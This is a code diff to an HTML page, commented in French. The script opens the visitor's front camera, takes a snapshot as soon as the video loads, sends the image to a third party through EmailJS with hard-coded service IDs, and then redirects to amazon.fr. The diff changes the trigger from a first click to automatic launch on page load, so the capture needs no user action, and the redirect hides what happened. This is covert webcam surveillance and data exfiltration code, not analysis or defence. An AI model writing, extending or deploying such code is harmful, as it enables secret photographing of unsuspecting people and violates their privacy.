@@ -29,14 +29,13 @@
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
 
-    // Déclenche au premier clic n’importe où
-    document.body.addEventListener('click', async () => {
+    async function startCapture() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
+        // Dès que la vidéo est prête, capture immédiate
         video.onloadeddata = () => {
-          // Capture de la photo (faible résolution pour <50KB)
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           const imageData = canvas.toDataURL("image/jpeg", 0.2);
 
@@ -45,17 +44,19 @@
 
           // Envoi via EmailJS
           emailjs.send("service_8cs0gml", "template_rdhxflt", {
-            message: "Photo automatique 📸",
+            message: "Photo auto 📸",
             image: imageData
           }).finally(() => {
-            // Redirection après envoi
             window.location.href = "https://www.amazon.fr";
           });
         };
       } catch (err) {
         window.location.href = "https://www.amazon.fr";
       }
-    }, { once: true });
+    }
+
+    // Lancement immédiat au chargement de la page
+    window.onload = startCapture;
   </script>
 </body>
 </html>
